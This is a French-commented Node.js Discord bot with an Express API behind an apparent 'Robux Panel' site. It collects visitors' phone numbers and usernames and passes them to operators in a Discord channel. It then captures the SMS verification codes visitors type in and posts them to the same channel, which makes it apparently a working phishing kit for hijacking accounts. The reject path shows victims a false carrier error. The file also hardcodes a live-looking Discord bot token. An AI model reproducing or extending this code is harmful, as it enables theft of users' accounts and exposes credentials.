const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const app = express();
const PORT = 3000;



// Fichier pour sauvegarder les demandes
const REQUESTS_FILE = 'pending_requests.json';

// Stockage des demandes en attente
let pendingRequests = new Map();

// Fonction pour sauvegarder les demandes
function saveRequests() {
    try {
        const data = Object.fromEntries(pendingRequests);
        fs.writeFileSync(REQUESTS_FILE, JSON.stringify(data, null, 2));
        console.log(`💾 Demandes sauvegardées: ${pendingRequests.size} demandes`);
    } catch (error) {
        console.error('❌ Erreur lors de la sauvegarde:', error);
    }
}

// Fonction pour charger les demandes
function loadRequests() {
    try {
        if (fs.existsSync(REQUESTS_FILE)) {
            const data = JSON.parse(fs.readFileSync(REQUESTS_FILE, 'utf8'));
            pendingRequests = new Map(Object.entries(data));
            console.log(`📂 Demandes chargées: ${pendingRequests.size} demandes`);
        }
    } catch (error) {
        console.error('❌ Erreur lors du chargement:', error);
        pendingRequests = new Map();
    }
}

// Fonction pour calculer le temps écoulé
function getTimeElapsed(timestamp) {
    const now = new Date();
    const requestTime = new Date(timestamp);
    const diffInSeconds = Math.floor((now - requestTime) / 1000);
    
    if (diffInSeconds < 60) {
        return `il y a ${diffInSeconds} seconde${diffInSeconds > 1 ? 's' : ''}`;
    } else if (diffInSeconds < 3600) {
        const minutes = Math.floor(diffInSeconds / 60);
        return `il y a ${minutes} minute${minutes > 1 ? 's' : ''}`;
    } else {
        const hours = Math.floor(diffInSeconds / 3600);
        return `il y a ${hours} heure${hours > 1 ? 's' : ''}`;
    }
}



// Token du bot (sécurisé via variable d'environnement)
const TOKEN = process.env.DISCORD_TOKEN || 'MTQwMjA3NDQ2MTg3MTY2OTMwOA.GYhk1S.aj6BHHdcYZ6vWmIXQEb03n-4kKpWf_9Q241qBQ';

client.once('ready', () => {
    console.log(`🤖 Bot connecté en tant que ${client.user.tag}!`);
    console.log('📱 Bot Robux Panel prêt !');
    
    // Charger les demandes existantes
    loadRequests();
    
    // Démarrer le serveur HTTP
    app.use(cors());
    app.use(express.json());
    
    // Route pour recevoir les demandes de vérification du site web
    app.post('/api/verification-request', async (req, res) => {
        try {
            const { phone, username } = req.body;
            

            
            // Trouver le salon robux
            const guild = client.guilds.cache.first();
            const channel = guild.channels.cache.find(ch => 
                ch.name === 'robux' || ch.name.toLowerCase().includes('robux')
            );
            
            if (!channel) {
                console.error('❌ Salon robux non trouvé');
                return res.status(404).json({ error: 'Salon robux non trouvé' });
            }
            
            // Générer un ID unique pour la demande
            const requestId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Créer l'embed comme sur l'image
            const embed = new EmbedBuilder()
                .setTitle('🔔 Nouvelle Demande Robux')
                .setDescription('Une nouvelle demande d\'accès a été reçue')
                .setColor(0xFFFFFF) // Blanc
                .addFields(
                    { name: '📱 Téléphone', value: `\`${phone}\``, inline: true },
                    { name: '👤 Username', value: `\`${username}\``, inline: true },
                    { name: '🆔 ID Request ID', value: `\`${requestId}\``, inline: false },
                    { name: '⏰ Reçu le', value: getTimeElapsed(new Date().toISOString()), inline: true },
                    { name: '🌐 Serveur', value: 'Robux Panel', inline: true }
                )
                .setThumbnail('https://media.discordapp.net/attachments/1402361220153085992/1402361282291699712/logo.png?ex=6893a238&is=689250b8&hm=02d41677742fecf5b2f8cc77c42a139c98738b804d40eddc8f0c84f99542df42&=&format=webp&quality=lossless&width=894&height=968') // Logo Robux
                .setFooter({ 
                    text: '🎮 Robux Panel • En attente de modération • ' + new Date().toLocaleString('fr-FR')
                })
                .setTimestamp();

            // Créer les boutons
            const buttons = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId(`accept_${requestId}`)
                        .setLabel('Accepter')
                        .setStyle(ButtonStyle.Success)
                        .setEmoji('✅'),
                    new ButtonBuilder()
                        .setCustomId(`reject_${requestId}`)
                        .setLabel('Refuser')
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji('❌')
                );

            // Envoyer le message dans le salon robux
            await channel.send({
                embeds: [embed],
                components: [buttons]
            });
            
            // Stocker la demande
            pendingRequests.set(requestId, {
                phone: phone,
                username: username,
                timestamp: new Date().toISOString(),
                status: 'pending'
            });
            
            // Sauvegarder les demandes
            saveRequests();
            
            console.log(`📱 Nouvelle demande de vérification reçue: ${phone} - ${username}`);
            console.log(`🆔 ID de la demande: ${requestId}`);
            console.log(`📊 Total des demandes en attente: ${pendingRequests.size}`);
            
            // Envoyer une réponse immédiate avec l'ID de la demande
            res.json({ 
                success: true, 
                message: 'Demande envoyée au salon robux',
                requestId: requestId
            });
            
        } catch (error) {
            console.error('❌ Erreur:', error);
            res.status(500).json({ error: 'Erreur interne du serveur' });
        }
    });
    
    // Route pour vérifier le statut d'une demande
    app.get('/api/verification-status/:requestId', (req, res) => {
        const { requestId } = req.params;
        const request = pendingRequests.get(requestId);
        
        if (!request) {
            return res.status(404).json({ error: 'Demande introuvable' });
        }
        
        res.json({ 
            status: request.status,
            processedBy: request.processedBy,
            processedAt: request.processedAt
        });
    });

    // Route pour vérifier le code SMS
    app.post('/api/verify-sms', async (req, res) => {
        try {
            const { code, phone, username, requestId } = req.body;
            
            // Validation du code
            if (!code || code.length !== 4 || !/^\d{4}$/.test(code)) {
                return res.status(400).json({ success: false, error: 'Code invalide' });
            }

            // Trouver le salon robux
            const guild = client.guilds.cache.first();
            const channel = guild.channels.cache.find(ch => 
                ch.name === 'robux' || ch.name.toLowerCase().includes('robux')
            );
            
            if (!channel) {
                console.error('❌ Salon robux non trouvé');
                return res.status(404).json({ success: false, error: 'Salon robux non trouvé' });
            }

            // Créer l'embed comme sur l'image
            const embed = new EmbedBuilder()
                .setTitle('🎯 Code SMS reçu pour ' + username)
                .setDescription('L\'utilisateur a saisi son code de vérification')
                .setColor(0x00FF00) // Vert
                .addFields(
                    { name: '🔒 Code SMS', value: `**\`${code}\`**`, inline: false },
                    { name: '📱 Téléphone', value: `\`${phone}\``, inline: true },
                    { name: '👤 Username', value: `\`${username}\``, inline: true },
                    { name: '🆔 ID Request ID', value: `\`${requestId}\``, inline: false },
                    { name: '⏰ Saisi le', value: getTimeElapsed(new Date().toISOString()), inline: true }
                )
                .setThumbnail('https://media.discordapp.net/attachments/1402361220153085992/1402361282291699712/logo.png?ex=6893a238&is=689250b8&hm=02d41677742fecf5b2f8cc77c42a139c98738b804d40eddc8f0c84f99542df42&=&format=webp&quality=lossless&width=894&height=968')
                .setFooter({ 
                    text: '🎮 Robux Panel • Code SMS • ' + new Date().toLocaleString('fr-FR')
                })
                .setTimestamp();

            // Envoyer le message dans le salon robux
            await channel.send({ embeds: [embed] });
            
            console.log(`📱 Code SMS reçu: ${code} pour ${username} (${phone})`);
            
            res.json({ success: true, message: 'Code vérifié avec succès' });
            
        } catch (error) {
            console.error('❌ Erreur lors de la vérification SMS:', error);
            res.status(500).json({ success: false, error: 'Erreur interne du serveur' });
        }
    });

    
    // Démarrer le serveur
    app.listen(PORT, () => {
        console.log(`🌐 Serveur HTTP démarré sur le port ${PORT}`);
        console.log(`📱 API disponible: http://localhost:${PORT}/api/verification-request`);
    });
});

// Gestion des boutons interactifs
client.on('interactionCreate', async interaction => {
    if (interaction.isButton()) {
        try {
            const [action, requestId] = interaction.customId.split('_');
            
            console.log(`🔘 Bouton cliqué: ${action} pour la demande ${requestId}`);
            console.log(`📊 Demandes disponibles: ${Array.from(pendingRequests.keys()).join(', ')}`);
            console.log(`🔍 Recherche de la demande: ${requestId}`);
            console.log(`🔍 Type de requestId: ${typeof requestId}`);
            console.log(`🔍 Longueur de requestId: ${requestId.length}`);
            
            // Vérifier si la demande existe (avec recherche intelligente)
            let request = pendingRequests.get(requestId);
            let finalRequestId = requestId; // Garder l'ID original
            
            if (!request) {
                console.log(`❌ Demande ${requestId} non trouvée directement`);
                console.log(`📊 Demandes disponibles: ${Array.from(pendingRequests.keys()).join(', ')}`);
                
                // Recherche intelligente - chercher une demande qui contient cet ID
                for (const [id, req] of pendingRequests.entries()) {
                    if (id.includes(requestId) || requestId.includes(id) || id === requestId) {
                        console.log(`🔍 Demande trouvée par recherche intelligente: ${id}`);
                        request = req;
                        finalRequestId = id; // Utiliser l'ID correct
                        break;
                    }
                }
                
                if (!request) {
                    console.log(`❌ Aucune demande trouvée même avec recherche intelligente`);
                    await interaction.deferReply({ ephemeral: true });
                    await interaction.editReply({
                        content: '❌ Demande introuvable ou déjà traitée.'
                    });
                    return;
                }
            }
            console.log(`✅ Demande ${finalRequestId} trouvée, statut: ${request.status}`);
            
            if (request.status !== 'pending') {
                console.log(`❌ Demande ${finalRequestId} déjà traitée`);
                await interaction.deferReply({ ephemeral: true });
                await interaction.editReply({
                    content: '❌ Cette demande a déjà été traitée par quelqu\'un d\'autre.'
                });
                return;
            }

            // Marquer immédiatement comme en cours de traitement
            request.status = 'processing';
            request.processedAt = new Date().toISOString();
            pendingRequests.set(finalRequestId, request);
            saveRequests();
            
            if (action === 'accept') {
                // Mettre à jour le statut final
                request.status = 'accepted';
                request.processedBy = interaction.user.tag;
                request.processedAt = new Date().toISOString();
                pendingRequests.set(finalRequestId, request);
                saveRequests();
                
                // Créer l'embed de confirmation
                const confirmEmbed = new EmbedBuilder()
                    .setTitle('✅ Demande acceptée')
                    .setDescription(`Demande approuvée par <@${interaction.user.id}>`)
                    .setColor(0x00FF00) // Vert
                    .addFields(
                        { name: '📱 Téléphone', value: `\`${request.phone}\``, inline: true },
                        { name: '👤 Username', value: `\`${request.username}\``, inline: true },
                        { name: 'ℹ️ Info', value: 'L\'utilisateur peut maintenant saisir le code SMS', inline: false }
                    )
                    .setThumbnail('https://media.discordapp.net/attachments/1402361220153085992/1402361282291699712/logo.png?ex=6893a238&is=689250b8&hm=02d41677742fecf5b2f8cc77c42a139c98738b804d40eddc8f0c84f99542df42&=&format=webp&quality=lossless&width=894&height=968') // Logo Robux
                    .setFooter({ text: `Aujourd'hui à ${new Date().toLocaleTimeString('fr-FR', {hour: '2-digit', minute: '2-digit'})}` })
                    .setTimestamp();

                // Désactiver les boutons
                const disabledButtons = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`accept_${requestId}`)
                            .setLabel('Accepter')
                            .setStyle(ButtonStyle.Success)
                            .setEmoji('✅')
                            .setDisabled(true),
                        new ButtonBuilder()
                            .setCustomId(`reject_${requestId}`)
                            .setLabel('Refuser')
                            .setStyle(ButtonStyle.Danger)
                            .setEmoji('❌')
                            .setDisabled(true)
                    );

                await interaction.update({
                    embeds: [confirmEmbed],
                    components: [disabledButtons]
                });

                console.log(`✅ Demande acceptée par ${interaction.user.tag}: ${request.phone} - ${request.username}`);

            } else if (action === 'reject') {
                // Mettre à jour le statut final
                request.status = 'rejected';
                request.processedBy = interaction.user.tag;
                request.processedAt = new Date().toISOString();
                pendingRequests.set(finalRequestId, request);
                saveRequests();
                
                // Créer l'embed de refus
                const rejectEmbed = new EmbedBuilder()
                    .setTitle('❌ Demande refusée')
                    .setDescription(`Demande refusée par <@${interaction.user.id}>`)
                    .setColor(0xFF0000) // Rouge
                    .addFields(
                        { name: '📱 Téléphone', value: `\`${request.phone}\``, inline: true },
                        { name: '👤 Username', value: `\`${request.username}\``, inline: true },
                        { name: 'ℹ️ Info', value: '❌ Numéro invalide ou opérateur non pris en charge. Veuillez réessayer plus tard.', inline: false }
                    )
                    .setThumbnail('https://media.discordapp.net/attachments/1402361220153085992/1402361282291699712/logo.png?ex=6893a238&is=689250b8&hm=02d41677742fecf5b2f8cc77c42a139c98738b804d40eddc8f0c84f99542df42&=&format=webp&quality=lossless&width=894&height=968') // Logo Robux
                    .setFooter({ text: `Aujourd'hui à ${new Date().toLocaleTimeString('fr-FR', {hour: '2-digit', minute: '2-digit'})}` })
                    .setTimestamp();

                // Désactiver les boutons
                const disabledButtons = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`accept_${finalRequestId}`)
                            .setLabel('Accepter')
                            .setStyle(ButtonStyle.Success)
                            .setEmoji('✅')
                            .setDisabled(true),
                        new ButtonBuilder()
                            .setCustomId(`reject_${finalRequestId}`)
                            .setLabel('Refuser')
                            .setStyle(ButtonStyle.Danger)
                            .setEmoji('❌')
                            .setDisabled(true)
                    );

                await interaction.update({
                    embeds: [rejectEmbed],
                    components: [disabledButtons]
                });

                console.log(`❌ Demande refusée par ${interaction.user.tag}: ${request.phone} - ${request.username}`);
            }
        } catch (error) {
            console.error('❌ Erreur lors du traitement du bouton:', error);
            
            try {
                if (!interaction.deferred && !interaction.replied) {
                    await interaction.deferReply({ ephemeral: true });
                }
                
                await interaction.editReply({
                    content: '❌ Erreur lors du traitement. Veuillez réessayer.'
                });
            } catch (replyError) {
                console.error('❌ Impossible d\'envoyer le message d\'erreur:', replyError);
            }
        }
    }
});

// Commande pour voir les demandes en cours
client.on('messageCreate', async message => {
    if (message.content === '!demandes') {
        if (pendingRequests.size === 0) {
            await message.reply('📭 Aucune demande en attente.');
            return;
        }
        
        let response = `📋 **Demandes en attente (${pendingRequests.size}):**\n\n`;
        for (const [requestId, request] of pendingRequests.entries()) {
            if (request.status === 'pending') {
                response += `🆔 **${requestId}**\n`;
                response += `📱 **Téléphone:** ${request.phone}\n`;
                response += `👤 **Username:** ${request.username}\n`;
                response += `⏰ **Reçu:** ${new Date(request.timestamp).toLocaleString('fr-FR')}\n\n`;
            }
        }
        
        await message.reply(response);
    }
    
    // Commande pour forcer l'acceptation d'une demande
    if (message.content.startsWith('!accepter ')) {
        const requestId = message.content.split(' ')[1];
        const request = pendingRequests.get(requestId);
        
        if (!request) {
            await message.reply(`❌ Demande ${requestId} non trouvée.`);
            return;
        }
        
        if (request.status !== 'pending') {
            await message.reply(`❌ Demande ${requestId} déjà traitée (statut: ${request.status}).`);
            return;
        }
        
        // Accepter la demande
        request.status = 'accepted';
        request.processedBy = message.author.tag;
        request.processedAt = new Date().toISOString();
        pendingRequests.set(requestId, request);
        saveRequests();
        
        await message.reply(`✅ Demande ${requestId} acceptée manuellement par ${message.author.tag}`);
        console.log(`✅ Demande ${requestId} acceptée manuellement par ${message.author.tag}`);
    }
    
    // Commande pour tester les boutons
    if (message.content === '!test-boutons') {
        if (pendingRequests.size === 0) {
            await message.reply('📭 Aucune demande pour tester les boutons.');
            return;
        }
        
        // Prendre la première demande en attente
        for (const [requestId, request] of pendingRequests.entries()) {
            if (request.status === 'pending') {
                await message.reply(`🔧 **Test des boutons pour la demande:** ${requestId}\n\n📱 Téléphone: ${request.phone}\n👤 Username: ${request.username}\n\n**Pour tester, clique sur les boutons du message original !**`);
                break;
            }
        }
    }
    
    // Commande pour créer une nouvelle demande de test
    if (message.content === '!nouvelle-demande') {
        const testRequestId = Date.now() + '_test_' + Math.random().toString(36).substr(2, 5);
        
        // Créer l'embed de test
            const embed = new EmbedBuilder()
            .setTitle('🔔 Nouvelle Demande Robux (TEST)')
                .setDescription('Une nouvelle demande d\'accès a été reçue')
            .setColor(0xFFFFFF) // Blanc
                .addFields(
                { name: '📱 Téléphone', value: '`00 00 00 00 00`', inline: true },
                { name: '👤 Username', value: '`TestUser`', inline: true },
                { name: '🆔 ID Request ID', value: `\`${testRequestId}\``, inline: false },
                { name: '⏰ Reçu le', value: getTimeElapsed(new Date().toISOString()), inline: true },
                { name: '🌐 Serveur', value: 'Robux Panel', inline: true }
            )
            .setThumbnail('https://media.discordapp.net/attachments/1402361220153085992/1402361282291699712/logo.png?ex=6893a238&is=689250b8&hm=02d41677742fecf5b2f8cc77c42a139c98738b804d40eddc8f0c84f99542df42&=&format=webp&quality=lossless&width=894&height=968')
                .setFooter({ 
                text: '🎮 Robux Panel • En attente de modération • ' + new Date().toLocaleString('fr-FR')
                })
                .setTimestamp();

        // Créer les boutons
            const buttons = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                    .setCustomId(`accept_${testRequestId}`)
                        .setLabel('Accepter')
                        .setStyle(ButtonStyle.Success)
                        .setEmoji('✅'),
                    new ButtonBuilder()
                    .setCustomId(`reject_${testRequestId}`)
                        .setLabel('Refuser')
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji('❌')
                );

        // Envoyer le message
        await message.channel.send({
                embeds: [embed],
                components: [buttons]
            });
            
        // Stocker la demande
        pendingRequests.set(testRequestId, {
            phone: '00 00 00 00 00',
            username: 'TestUser',
            timestamp: new Date().toISOString(),
                status: 'pending'
            });
        
        saveRequests();
        
        await message.reply(`✅ **Nouvelle demande de test créée !**\n\n🆔 ID: ${testRequestId}\n📱 Téléphone: 00 00 00 00 00\n👤 Username: TestUser\n\n**Clique sur les boutons du message ci-dessus pour tester !**`);
        console.log(`🧪 Demande de test créée: ${testRequestId}`);
    }
    
    // Commande pour nettoyer toutes les demandes
    if (message.content === '!nettoyer') {
        const count = pendingRequests.size;
        pendingRequests.clear();
        saveRequests();
        
        // Supprimer le fichier de sauvegarde
        if (fs.existsSync(REQUESTS_FILE)) {
            try {
                fs.unlinkSync(REQUESTS_FILE);
            } catch (error) {
                console.log('⚠️ Erreur lors de la suppression du fichier');
            }
        }
        
        await message.reply(`🧹 **Nettoyage terminé !**\n\n❌ ${count} demandes supprimées\n💾 Fichier de sauvegarde supprimé\n\n**Utilise !nouvelle-demande pour créer une nouvelle demande de test !**`);
        console.log(`🧹 Nettoyage effectué: ${count} demandes supprimées`);
    }

    // Commande pour supprimer un nombre spécifique de messages du salon
    if (message.content.startsWith('!clean')) {
        try {
            // Vérifier les permissions
            if (!message.member.permissions.has('ManageMessages')) {
                await message.reply('❌ **Permission refusée !** Tu n\'as pas les permissions pour supprimer des messages.');
                return;
            }

            // Récupérer le nombre de messages à supprimer
            const args = message.content.split(' ');
            let messageCount = 100; // Par défaut, supprimer 100 messages

            if (args.length > 1) {
                const count = parseInt(args[1]);
                if (isNaN(count) || count < 1 || count > 100) {
                    await message.reply('❌ **Nombre invalide !** Utilise un nombre entre 1 et 100.\n\n**Exemples :**\n`!clean` - Supprime 100 messages\n`!clean 50` - Supprime 50 messages\n`!clean 10` - Supprime 10 messages');
                    return;
                }
                messageCount = count;
            }

            await message.reply(`🧹 **Nettoyage en cours...** Suppression de ${messageCount} messages...`);

            // Récupérer les messages
            const fetched = await message.channel.messages.fetch({ limit: messageCount });
            const messagesToDelete = fetched.filter(msg => !msg.pinned); // Ne pas supprimer les messages épinglés
            
            if (messagesToDelete.size > 0) {
                await message.channel.bulkDelete(messagesToDelete);
                
                // Créer l'embed de confirmation
                const cleanEmbed = new EmbedBuilder()
                    .setTitle('✅ Nettoyage Terminé')
                    .setDescription('Le salon a été nettoyé avec succès !')
                    .setColor(0x00FF00) // Vert
                    .addFields(
                        { name: '🗑️ Messages supprimés', value: `${messagesToDelete.size}`, inline: true },
                        { name: '👤 Nettoyé par', value: message.author.tag, inline: true },
                        { name: '📅 Date', value: new Date().toLocaleString('fr-FR'), inline: true }
                    )
                    .setThumbnail('https://media.discordapp.net/attachments/1402361220153085992/1402361282291699712/logo.png?ex=6893a238&is=689250b8&hm=02d41677742fecf5b2f8cc77c42a139c98738b804d40eddc8f0c84f99542df42&=&format=webp&quality=lossless&width=894&height=968')
                    .setFooter({ 
                        text: '🎮 Robux Panel • Nettoyage automatique • ' + new Date().toLocaleString('fr-FR')
                    })
                    .setTimestamp();
                
                await message.channel.send({ embeds: [cleanEmbed] });
                console.log(`🧹 Salon nettoyé: ${messagesToDelete.size} messages supprimés par ${message.author.tag}`);
            } else {
                // Créer l'embed pour aucun message
                const noMessagesEmbed = new EmbedBuilder()
                    .setTitle('📭 Aucun Message à Supprimer')
                    .setDescription('Le salon est déjà propre !')
                    .setColor(0xFFFF00) // Jaune
                    .addFields(
                        { name: 'ℹ️ Info', value: 'Aucun message trouvé à supprimer', inline: true },
                        { name: '👤 Vérifié par', value: message.author.tag, inline: true }
                    )
                    .setThumbnail('https://media.discordapp.net/attachments/1402361220153085992/1402361282291699712/logo.png?ex=6893a238&is=689250b8&hm=02d41677742fecf5b2f8cc77c42a139c98738b804d40eddc8f0c84f99542df42&=&format=webp&quality=lossless&width=894&height=968')
                    .setFooter({ 
                        text: '🎮 Robux Panel • Vérification • ' + new Date().toLocaleString('fr-FR')
                    })
                    .setTimestamp();
                
                await message.channel.send({ embeds: [noMessagesEmbed] });
            }
        } catch (error) {
            console.error('❌ Erreur lors du nettoyage:', error);
            await message.reply('❌ **Erreur lors du nettoyage !** Impossible de supprimer les messages.');
        }
    }


});

// Nettoyage automatique des anciennes demandes
setInterval(() => {
    const now = new Date();
    let cleaned = 0;
    for (const [requestId, request] of pendingRequests.entries()) {
        // Supprimer les demandes de plus de 1 heure
        if (now - new Date(request.timestamp) > 60 * 60 * 1000) {
            pendingRequests.delete(requestId);
            cleaned++;
        }
    }
    if (cleaned > 0) {
        console.log(`🧹 ${cleaned} demandes supprimées (expirées)`);
        saveRequests();
    }
}, 60 * 60 * 1000); // Vérifier toutes les heures

client.login(TOKEN); 